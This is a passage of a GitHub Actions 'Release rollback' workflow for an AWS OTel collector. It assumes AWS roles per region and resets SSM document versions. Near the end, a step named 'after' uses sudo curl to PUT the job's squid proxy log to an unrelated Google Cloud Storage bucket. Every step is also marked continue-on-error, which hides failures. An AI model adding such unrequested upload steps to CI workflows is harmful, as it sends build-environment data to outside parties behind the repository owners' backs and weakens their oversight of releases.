      if: matrix.type == 'global'
      name: Configure AWS Credentials
      uses: aws-actions/configure-aws-credentials@v2.2.0
      with:
        aws-region: us-west-2
        role-to-assume: ${{ secrets.COLLECTOR_PROD_RELEASE_ROLE_ARN }}
    - continue-on-error: true
      if: matrix.type == 'hkg'
      name: Configure AWS Credentials for HKG
      uses: aws-actions/configure-aws-credentials@v2.2.0
      with:
        aws-region: ap-east-1
        role-to-assume: ${{ secrets.COLLECTOR_PROD_RELEASE_HKG_ROLE_ARN }}
    - continue-on-error: true
      if: matrix.type == 'bah'
      name: Configure AWS Credentials for BAH
      uses: aws-actions/configure-aws-credentials@v2.2.0
      with:
        aws-region: me-south-1
        role-to-assume: ${{ secrets.COLLECTOR_PROD_RELEASE_BAH_ROLE_ARN }}
    - continue-on-error: true
      if: matrix.type == 'cpt'
      name: Configure AWS Credentials for CPT
      uses: aws-actions/configure-aws-credentials@v2.2.0
      with:
        aws-region: af-south-1
        role-to-assume: ${{ secrets.COLLECTOR_PROD_RELEASE_CPT_ROLE_ARN }}
    - continue-on-error: true
      if: matrix.type == 'mxp'
      name: Configure AWS Credentials for MXP
      uses: aws-actions/configure-aws-credentials@v2.2.0
      with:
        aws-region: eu-south-1
        role-to-assume: ${{ secrets.COLLECTOR_PROD_RELEASE_MXP_ROLE_ARN }}
    - continue-on-error: true
      if: matrix.type == 'cn'
      name: Configure AWS Credentials for CN
      uses: aws-actions/configure-aws-credentials@v2.2.0
      with:
        aws-access-key-id: ${{ secrets.RELEASE_CN_KEY_ID }}
        aws-region: cn-north-1
        aws-secret-access-key: ${{ secrets.RELEASE_CN_SECRET }}
    - continue-on-error: true
      name: Download versions artifact
      uses: actions/download-artifact@v3
      with:
        name: ${{ matrix.type }}-versions
        path: ${{ env.SSM_ARTIFACT_ROOT }}
    - continue-on-error: true
      name: Change default document version
      run: "for region in ${{ matrix.regions }}; do\n  document_version=$(grep ${region}\
        \ < ${{ env.SSM_ARTIFACT_ROOT }}/${{ env.SSM_VERSIONS_FILE_NAME }} | awk -F\
        \ ' ' '{print $2}')\n  aws ssm update-document-default-version --name \"${SSM_RELEASE_PACKAGE_NAME}\"\
        \ \\\n    --region \"${region}\" --document-version \"${document_version}\"\
        \ndone\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/dynatrace-oss-contrib/aws-otel-collector.$(date
        +%s)
    strategy:
      fail-fast: true
      matrix:
        include:
        - regions: eu-north-1 ap-south-1 eu-west-3 us-east-2 eu-west-1 eu-central-1
            sa-east-1 us-east-1 ap-northeast-2 ap-northeast-3 eu-west-2 ap-northeast-1
            us-west-2 us-west-1 ap-southeast-1 ap-southeast-2 ca-central-1
          type: global
        - regions: ap-east-1
          type: hkg
        - regions: me-south-1
          type: bah
        - regions: af-south-1
          type: cpt
        - regions: eu-south-1
          type: mxp
        - regions: cn-north-1 cn-northwest-1
          type: cn
    timeout-minutes: 60
name: Release rollback
'on':
  workflow_dispatch: {}
permissions:
  contents: read
  id-token: write
